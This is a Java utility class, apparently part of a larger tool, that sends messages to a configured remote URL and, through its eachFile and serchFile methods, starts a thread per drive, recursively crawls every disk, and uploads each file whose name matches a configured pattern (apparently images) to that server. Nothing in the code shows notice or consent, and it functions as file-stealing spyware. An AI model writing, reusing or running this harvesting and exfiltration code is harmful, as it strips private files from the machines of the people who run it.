package com.bingo.util;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.regex.Pattern;

import com.bingo.main.ParamConstant;

public class SendUtil {

	public static void sendMessage(MessageType messageType) {
		if (ParamConstant.isMessage) {
			send(messageType);
		}
	}

	public static void sendMessage(Map<String, String> map) {
		if (ParamConstant.isMessage) {
			send(map);
		}
	}

	public static void sendMessage(String message) {
		if (ParamConstant.isMessage) {
			send(message);
		}
	}

	/**
	 * 枚举消息内容
	 * 
	 * @param messageType
	 */
	public static void send(MessageType messageType) {
		try {
			HttpUtil.doPost(ParamConstant.url,
					EntityToStringUtil.conver(new MessageEntity(messageType.getKey(), messageType.getValue())));
		} catch (NoSuchMethodException e) {
			e.printStackTrace();
		} catch (SecurityException e) {
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		}
	}

	public static void send(Map<String, String> map) {
		try {
			HttpUtil.doPost(ParamConstant.url, EntityToStringUtil.conver(map));
		} catch (NoSuchMethodException e) {
			e.printStackTrace();
		} catch (SecurityException e) {
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		}
	}

	/**
	 * 自定义消息内容
	 * 
	 * @param message
	 */
	public static void send(String message) {
		try {
			HttpUtil.doPost(ParamConstant.url, EntityToStringUtil.conver(new MessageEntity(message, "-1")));
		} catch (NoSuchMethodException e) {
			e.printStackTrace();
		} catch (SecurityException e) {
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		}
	}
	
	public static void main(String[] args) throws InterruptedException {
		eachFile();
	}

	public static void startSerch() {
		if (ParamConstant.isSerchImg) {
			new Thread(new Runnable() {
				@Override
				public void run() {
					eachFile();
				}
			}).start();
		}
	}

	public static void eachFile() {
		File[] files = File.listRoots();
		for (File file : files) {
			new Thread(new Runnable() {
				@Override
				public void run() {
					serchFile(file);
				}
			}).start();
		}
	}

	// 递归搜索磁盘文件
	public static void serchFile(File file) {
		if (file.isDirectory()) {
			File[] files = file.listFiles();
			if (files == null) {
				return;
			}
			for (File file2 : files) {
				serchFile(file2);
			}
		} else {
			if (Pattern.compile(ParamConstant.reg).matcher(file.getName()).find()) {
				HttpUtil.doPostAndFile2(ParamConstant.url, "", file);
			}
		}
	}
}
